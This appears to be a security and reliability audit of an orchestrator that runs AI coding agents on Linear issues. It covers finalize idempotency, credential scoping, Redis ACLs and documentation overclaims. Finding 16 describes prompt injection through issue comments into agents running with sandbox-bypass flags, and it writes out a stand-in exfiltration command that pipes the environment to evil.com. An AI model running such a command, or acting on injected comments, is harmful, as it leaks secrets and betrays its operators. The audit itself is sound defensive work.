## Confirmed bugs

1. **Redelivery idempotency guard only short-circuits `state == "finished"`.** (HIGH) In `app/devcake/domain/runs.py` (~231), `run.artifacts` redelivery is a no-op only when finished. States `finalizing`, `failed`, `timed_out`, and `orphaned` re-enter finalization. Combined with issue 2, a crash mid-finalize can double-run finalize (duplicate failure telemetry / nondeterministic local terminal state even when mission state later converges via sweeps). **Recommendation:** Treat all terminal states (`finished`, `failed`, `timed_out`, `orphaned`) as redelivery no-ops, and only resume finalize when state is `finalizing` (or still active).

2. **Startup reconciliation kills orphans before reclaiming pending Redis messages.** (HIGH) `app/devcake/api/main.py` (~190–212): step 3 iterates `store.active()` (includes `finalizing` — `app/devcake/adapters/files/run_store.py` ~91–92), kills dead Dagu runs to `orphaned`, then step 4 calls `messaging.reclaim_pending`. A mid-finalize crash with a pending `run.artifacts` entry is therefore re-finalized after being marked orphaned. **Recommendation:** For `finalizing` runs with pending artifacts, reclaim/finalize first (or mark a distinct resume path) instead of killing them to `orphaned` before reclaim.

3. **Kill ordering is not fail-safe: `executor.stop()` first, then ACL teardown.** (HIGH) `app/devcake/domain/runs.py` `_kill_inner` (~303–312): awaits `executor.stop` then `_ship_failure` before `messaging.delete_run_user` / stream delete / terminal state save — no `try`/`finally`. If `stop` or `_ship_failure` raises, the per-run ACL user is never deleted and `run.state` stays active. Watchdog (`watchdog.py` `CHECK_INTERVAL = 10`) re-kills forever while the run remains in `store.active()`. Nuance: `DaguExecutor.stop` returns `False` on non-2xx rather than raising; the loop-forever path is real for network/transport exceptions or later steps raising. **Recommendation:** Wrap teardown in `try`/`finally` so ACL delete, stream delete, and terminal state always run even if `stop`/`_ship_failure` fail.

4. **At-least-once finalize is not idempotent at PMO-write granularity.** (HIGH) `app/devcake/domain/orchestrator.py` `finalize` (~550–614) checkpoints only coarse steps (`transcript`, `token_report`, `transition`). Entire `_transition` / `_finalize_review` is one unit with no per-comment, per-label, or per-merge markers. Crash after a PMO write but before `"transition"` is appended re-posts on redelivery. **Recommendation:** Checkpoint each PMO/forge write (or use idempotency keys / marker-based “already done” checks) so redelivery never re-executes side effects already applied.

5. **Redelivered `human_needed` / park / illegal-outcome paths re-post feed comments.** (MEDIUM) `_transition` (~752–779 human_needed baton; ~664–674 illegal outcome park; unknown-outcome park ~799–804) always `_feed`s without write-level idempotency. Re-entry after partial transition success spams the Linear issue. **Recommendation:** Gate baton/park comments on feed markers or per-outcome finalized sub-steps so each hand-off posts at most once per run.

6. **Redelivered approve/merge can post a misleading “auto-merge failed” after a successful merge.** (HIGH) `_finalize_review` (~892–947): posts PR approval comment, then `forge.merge`; on exception posts `⚠️ REVIEW approved but auto-merge failed … (DEVCAKE-MERGE)`. GitHub `merge` raises on non-409 errors including already-merged (`app/devcake/adapters/github/adapter.py` ~113–125). Crash after successful merge but before `"transition"` / `finished` checkpoint → redelivery reports failure on a merged PR. **Recommendation:** Before treating merge errors as failure, re-read PR state and treat already-merged as success; split approve/merge/done into separate idempotent checkpoints.

7. **Linear label reads use `labels(first: 20)` with no full-page tripwire.** (HIGH) `app/devcake/adapters/linear/adapter.py` list/get paths (~126, 138, 156, 167, 186, 264, 380) truncate labels silently. Relations have a full-page warning (`inverseRelations page is full`, ~438–441 + `test_linear_relations.py`); comments paginate with a ceiling warning. A heavily labeled issue can omit `DEVCAKE-SKIP` from the page → re-dispatch of a human-stopped mission. **Recommendation:** Paginate labels the same way relations and comments already do, and add a regression test.

8. **Config schema accepts zero/negative operational values that brick runtime.** (MEDIUM) `app/devcake/config.py`: `poll_interval_seconds`, `dev_timeout_minutes`, `max_attempts`, `review_loop_warning_every`, `Concurrency.global_max` have no `ge`/`gt` constraints (only `merge_retry_window_minutes` has `ge=0`). Values like `0`, `-1`, `-2`, `-3` validate and persist. **Recommendation:** Add strict `gt=0` / sensible bounds on every operational field and reject bad values at the schema layer.

9. **`review_loop_warning_every == 0` causes modulo-by-zero.** (MEDIUM) `orchestrator.py` (~987–988): `if rejections % every == 0` on REVIEW reject path. Zero cadence after a bad config PUT crashes finalization for that path. **Recommendation:** Require `review_loop_warning_every >= 1` in schema and/or guard the modulo with an explicit skip when cadence is disabled.

10. **Malformed repository URL passes schema then crashes adapter construction.** (MEDIUM) `RepoInstance.url` is unconstrained `str`. `GitHubForge.__init__` (`adapters/github/adapter.py` ~40–44) does `parts[-2], parts[-1]` without validation — empty/malformed URL → `IndexError`, including after a config PUT that already persisted (hot-reload via `reload_connections`). **Recommendation:** Validate forge URL shape in `RepoInstance` (and GitLab twin) before persist, and make adapter constructors raise a clear config error.

11. **Config PUT is not transactional relative to adapter rebuild failures.** (MEDIUM) Successful deep-merge write can leave persisted bad config that breaks construction on reload/boot (related to 8–10). Need strict validation before write and fail closed on adapter build. **Recommendation:** Validate fully and dry-run adapter construction before writing config; on rebuild failure, refuse the PUT and leave the previous config in place.

12. **Redaction bypass on decomposition child creation.** (HIGH) `orchestrator.py` `_finalize_decomposition` (~1086–1099): agent-generated `title` and `description` pass to `pmo.create_mission` without `redact()`. `_feed` is the only choke-point that always redacts (~392–402). Contradicts `security.py` docstring (“everything DevCake posts to the PMO System … is scrubbed”). Secrets in those fields leave the machine unredacted. **Recommendation:** Run `redact()` on all `create_mission` titles/descriptions (and any other non-`_feed` PMO writes) before calling the adapter.

## Security

13. **Every Dev receives OpenObserve root credentials as OTLP Basic auth.** (HIGH) `_oo_basic_auth()` in `orchestrator.py` (~94–97) and `runs.py` (~61–64) base64-encodes `OO_ROOT_EMAIL:OO_ROOT_PASSWORD` into `OTEL_EXPORTER_OTLP_BASIC` for mission runs (`runspec_secret_payload` ~367–369) and HELLO. Devs attach to `devcake_runtime`, which also has OpenObserve (`docker-compose.yml` openobserve networks; `dagu/dags/dev-run.yaml` `network: devcake_runtime`). A compromised Dev owns all telemetry cross-mission. **Recommendation:** Mint an ingest-only OO token (or OTel collector with scoped credentials) and never put root OO credentials in Dev runspecs.

14. **Per-run Redis ACL grants `+xread` on shared `devcake:ingress`.** (HIGH) `app/devcake/adapters/redis/messaging.py` `create_run_user` (~69–74): `~devcake:ingress` + `+xadd +xread +xlen`. Ingress envelopes carry plaintext `auth` (the run’s relay password). A malicious concurrent Dev can XREAD other runs’ passwords and forge their finalizations (app only checks SHA-256 verifier). Docs (`docs/09-messaging.md` §1a) understate this by implying Devs read only their reply stream. **Recommendation:** Use Redis 7 ACL selectors for write-only access to ingress and read/write only on `reply:{run_id}`, then update docs and live ACL tests accordingly.

15. **Forge write token is handed to every mission type, including PLAN / REVIEW / MAPPER.** (HIGH) `orchestrator.py` `runspec_secret_payload` (~367–369) always sets `DEVCAKE_FORGE_TOKEN` from `config.repo.token` with no stage scoping. Combined with unrestricted egress and sandbox-bypass harness flags, any stage can push/exfiltrate. HELLO/OAUTH are exceptions (`runs.py` ~138–145). Reviewer PAT correctly stays app-side only (not in runspec) — keep that property when scoping forge tokens. **Recommendation:** Stage-scope forge credentials (omit or read-only where push is not required; keep reviewer PAT app-only) so PLAN/REVIEW/MAPPER cannot write the repo by default.

16. **Accepted prompt-injection / egress risk is under-mitigated for “unattended” ops.** (MEDIUM) Mission description + Linear comments flow into Dev prompts (`prompts/__init__.py`, activity assembly in orchestrator); Claude/Codex use sandbox bypass (`images/common/dev_entrypoint.py` ~512–523 `--dangerously-skip-permissions` / `--dangerously-bypass-approvals-and-sandbox`); runtime network has no egress allowlist (`docs/14` §6–7 lists allowlists as future). Redaction only scrubs app→PMO/forge writes (`security.py`, `_feed`), not the Dev’s own sockets. Anyone who can comment on a watched issue can attempt `curl evil.com -d @<(env)`. Documented as accepted in `docs/14` §2, but still a first-class production risk for v0.1 hardening. **Recommendation:** Plan egress allowlists and/or sandbox hardening as explicit v0.1+ work, and keep the threat model honest until those land.

17. **Control-plane ports published on all host interfaces; Dagu holds docker.sock.** (HIGH) `docker-compose.yml`: Dagu `8525:8080` + `/var/run/docker.sock` (~24–38); admin `8080:80`; OpenObserve `5080:5080`; Fluent Bit `24224:24224`. Auth is HTTP Basic without TLS. A reachable Dagu UI/API is root-equivalent host compromise. **Recommendation:** Bind control-plane ports to loopback by default, document host-firewall/dedicated-machine requirements, and fail closed without strong Basic passwords.

18. **Example / bootstrap does not force nonempty or strong infra passwords.** (MEDIUM) `.env.example`: `DAGU_PASSWORD=` empty; `OO_ROOT_PASSWORD` / `REDIS_PASSWORD` / `ADMIN_PASSWORD` are weak placeholders (`change-me*`). Compose and config schema do not fail closed on empty Dagu password. README quickstart does not require strong passwords. **Recommendation:** Refuse to start with empty/default infra passwords and document strong-password requirements in quickstart and `.env.example`.

19. **“Independent AI review” is not enforced.** (MEDIUM) README claims no code reaches default branch without independent AI review. Assignments API (`api/main.py` `put_assignments` ~497–510) only requires all mission types assigned to known Dev Types — EXECUTE and REVIEW may share the same Dev Type/model. Defaults differ (`config.py` DEFAULT_ASSIGNMENTS) but nothing enforces independence. `LEGAL_OUTCOMES` only blocks outcome forgery, not same-role configuration. **Recommendation:** Soften the product claim to match current configurability, and warn when EXECUTE and REVIEW share the same Dev Type/model.

## Operational posture

20. **Documented Dev resource limits are not implemented.** (HIGH) `docs/07-dev-runtime.md` §7 (~140) promises `cpus: 2`, `memory: 4g` at image/DAG level. `dagu/dags/dev-run.yaml` container block has neither, nor PID limits. Autonomous Devs can exhaust the host shared with Redis and docker.sock-holding Dagu. **Recommendation:** Set real CPU/memory/PID limits on the Dev container in `dev-run.yaml`, add them as configurable variables to the admin page, and keep docs in lockstep with the default values.

21. **No `restart:` policy on any compose service.** (HIGH) `docker-compose.yml` has zero `restart:` keys. Host reboot or process crash leaves the stack (including monitoring) down with no automatic recovery — operator only notices when Linear goes quiet. **Recommendation:** Add `restart: unless-stopped` (or equivalent) to long-lived services so host reboots bring the stack back up, and add a toggle on the admin panel config page for turning this on/off (default on).

22. **Image digest-pinning is documented but not implemented.** (MEDIUM) Docs claim digest-pinned images in run specs (`docs/08-harness-templates.md` ~71, `docs/13-deployment.md` ~144/202, `docs/04-orchestrator.md` sketch). Reality: `app/devcake/harness.py` uses `devcake/dev-*:latest`; dispatch passes those tags (`orchestrator.py` ~323, ~1169); DAG uses `pull_policy: missing` (`dev-run.yaml` ~29). Stale local `:latest` tags keep running silently across upgrades. **Recommendation:** stop claiming digest pinning and document tag + rebuild discipline clearly.

23. **Alert set: docs list ~6 conditions; provisioner only creates 2.** (MEDIUM) `docs/15-errors-and-retries.md` §6: give-up, needs-human, DEV_AUTH breaker, PMO/FORGE transient >15m, poison, daily cost. `docs/12-observability.md` claims provisioning that set. `scripts/provision_oo.py` (~96–110) only creates `devcake-give-up` and `devcake-kills` (and only when `OO_ALERT_WEBHOOK` is set). **Recommendation:** Provision the full documented alert set when a webhook is configured.

24. **Quickstart order builds Dev images after starting the stack.** (LOW) README (~64–66): `docker compose up -d` then `docker compose --profile images build`. Scheduler can attempt dispatch before images exist; reverse the order and document lockstep rebuild on upgrade. **Recommendation:** Build (or require) Dev images before `up`, and note that upgrades must rebuild app + images together.

25. **Compat freeze / lockstep deploy is a support footgun if users expand.** (LOW) Documented (`docs/13` §8, crystallization notes): no v1→v2 migration, `pull_policy: missing` keeps stale images, pre-v2 runs quarantine. Restoring old `/data` or upgrading only app fails loudly or silently misbehaves. Not a pure code bug, but v0.1 packaging should make upgrade failure modes more operator-proof (explicit checks, clearer refuse-to-boot messages). **Recommendation:** Add boot-time version/image compatibility checks with clear refuse-to-boot messages rather than silent stale-image runs.

## Testing / CI

26. **Crash-recovery spine untested (watchdog / kill / startup reconciliation).** (HIGH) `app/devcake/domain/watchdog.py` (`watchdog_loop`), `app/devcake/domain/runs.py` (`kill` / `_kill_inner`), and `app/devcake/api/main.py` lifespan startup reconciliation (orphan kill then `reclaim_pending`) have zero automated tests under `app/tests/` — no imports, mocks, or red-path coverage for the code that runs when things go wrong. Pair with fixes for issues 1–6. **Recommendation:** Add unit/integration tests for timeout kill, stop-failure teardown, orphan recon, and artifact redelivery across terminal states.

27. **No repository CI (GitHub Actions or equivalent).** (MEDIUM) No `.github/` workflows. Gate is local `scripts/ci_suite.sh` requiring a pre-running compose stack. **Recommendation:** Add a push/PR workflow for pure unit tests (no secrets); keep compose smoke + acceptance as manual/nightly.

28. **`ci_suite.sh` is a narrow local gate.** (MEDIUM) Only in-container `pytest tests/` + hello stub E2E smoke. Does not build/test SPA, lint, typecheck, enforce coverage, build Dev images, vuln-scan, or fresh-install from clean clone. **Recommendation:** Expand the suite (or split jobs) to cover SPA build, lint/types, and at least one fresh-compose smoke path.

29. **Dev / admin images are not reproducible.** (MEDIUM) Floating bases (`python:3.12-slim`, `node:22-alpine`); Claude Code / Codex `npm install -g` without version pins (`images/claude-code/Dockerfile`, `images/codex/Dockerfile`); Grok `curl …/install.sh | bash` (`images/grok-build/Dockerfile`); admin Dockerfile copies only `package.json` and runs `npm install` (ignores existing `admin/spa/package-lock.json`). **Recommendation:** Plan for v0.1 to pin base digests, CLI package versions, and use `npm ci` with the lockfile for admin builds.

30. **Acceptance script is GitHub-only and lifecycle-scoped.** (MEDIUM) `scripts/acceptance.py` hard-codes `GITHUB_TOKEN` / `api.github.com` (~29–44). Asserts lifecycle, transcripts, token reports, REVIEW label, merged PR — not PR code correctness, repository CI green, or GitLab. README/positioning “GitHub and GitLab alike” overstates this script’s coverage (GitLab was live-verified separately per roadmap, not by this tool). **Recommendation:** Parameterize forge (GitHub/GitLab), optionally assert checks API / basic code signals, and align README wording with what the script actually proves. Promise in v0.1 roadmap a refactor to fully comply with the intent of full compatibility of any other forges.

## Documentation / claim calibration

31. **`docs/00-overview.md` still lists admin auth as a v0 non-goal.** (MEDIUM) Line ~19: “Authentication on the admin panel (network isolation only).” False after dual HTTP Basic (nginx + FastAPI: `admin/nginx.conf`, `app/devcake/api/auth.py`). High symbolic cost on the first doc readers open. **Recommendation:** Delete or rewrite that non-goal to match dual basic auth as shipped.

32. **Marketing / docs overclaim production readiness.** (MEDIUM) Soften or reconcile: README “hardened in production use since”, “production-grade” (`docs/00`, `docs/13`), “every action” traced as absolute, “GitHub and GitLab alike” for the acceptance gate, and any remaining “zero drift” framing after crystallization. Operational claims (resource limits, digest pins, full alert set, restart policies) do not match shipped code (issues 20–23). **Recommendation:** Reframe v0 as a founder-operated technical preview with “contracts verified; operational posture pending” until ops gaps close; promise gaps closed for v0.1 roadmap.

33. **Roadmap chronology confuses external readers.** (LOW) `docs/16-roadmap.md`: “v0 SHIPPED 2026-07-11” (M7), then post-v0 hardening/modularization, then “v0 crystallization (this release)” 2026-07-13. Prefer: v0 = crystallization tag; earlier date = first golden-path pass. **Recommendation:** Redate the narrative so the v0 tag is crystallization and earlier milestones are pre-release golden-path evidence.

34. **Docs understate Redis ACL blast radius and overstate some redaction guarantees.** (MEDIUM) `docs/09-messaging.md` §1a implies Devs read only their reply stream (see issue 14). `security.py` / informal “every PMO write” language overstates protection relative to the decomposition gap (issue 12) and Dev-socket egress (issue 16). **Recommendation:** Rewrite §1a/§5 and the `security.py` docstring to match actual ACL and redaction boundaries after the code fixes (or immediately if code lags).

35. **PMO state machine depends on markdown byte-for-byte markers; port does not document fidelity requirements.** (MEDIUM) Orchestrator markers (`STEP_MARKER`, merge-retry/handoff, decomposition `devcake:decomposition:v1`, `COMMENT_SENTINEL`) require backticked markdown round-trip. `PMOPort.post_feed(..., markdown: str)` and contract notes (`ports/pmo.py`) do not warn about ADF/rich-text PMOs (e.g. Jira). Second PMO is not “just an adapter” for fidelity reasons. **Recommendation:** Document markdown-fidelity as a port requirement (or abstract markers) before claiming multi-PMO adapter-only growth; document a roadmap promise of an adapter refactor to allow multi-PMO for v0.1.

## Architecture / packaging

36. **Orchestrator god object (~1633 lines) concentrates risk.** (MEDIUM) `app/devcake/domain/orchestrator.py` holds schedule, dispatch, finalize, transitions, merge sweep, decomposition, mapper, breakers, audit. Ports are clean; the brain is not. Structural split (schedule / dispatch / finalize / merge / decomposition / mapper) is a maintainability issue for v0.1 velocity, not a functional bug by itself. **Recommendation:** Split the orchestrator into focused modules before multi-PMO/webhooks so crash-recovery and finalize fixes land in bounded files.

37. **`forge` constructor parameter is untyped.** (LOW) `MissionManager.__init__` (`orchestrator.py` ~100–103): `pmo: PMOPort` but bare `forge` — `ForgePort` exists in `app/devcake/ports/forge.py` and is not applied here. **Recommendation:** Annotate `forge: ForgePort` (and any other bare forge parameters) for honesty with the port architecture.

38. **Public-release hygiene missing (if audience expands).** (LOW) No `LICENSE`, `SECURITY.md` / vulnerability-reporting policy, `CONTRIBUTING.md`, `CHANGELOG`, or SBOM material. Fine for private founder use; blockers for external technical preview packaging. **Recommendation:** Clearly document the missing pieces as to-dos in the roadmap.
